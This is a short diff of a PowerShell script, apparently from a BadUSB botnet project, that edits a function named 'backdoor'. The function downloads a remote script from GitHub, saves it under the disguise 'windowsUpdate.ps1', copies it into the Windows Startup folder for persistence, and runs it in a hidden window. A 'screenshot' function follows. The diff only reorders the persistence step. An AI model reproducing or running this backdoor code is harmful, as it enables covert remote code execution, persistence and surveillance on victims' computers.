@@ -24,10 +24,10 @@ $githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/mas
 
 function backdoor {
         Invoke-WebRequest -Uri $githubScript -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
+        Copy-Item "C:\Users\$env:username\Documents\windowsUpdate.ps1" -Destination "C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windowsUpdate.ps1"
         $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
         Invoke-Expression -Command:$command 
         Stop-Process -Name "cmd" -Confirm -PassThru
-        Copy-Item "C:\Users\$env:username\Documents\windowsUpdate.ps1" -Destination "C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windowsUpdate.ps1"
 }
 
 function screenshot {
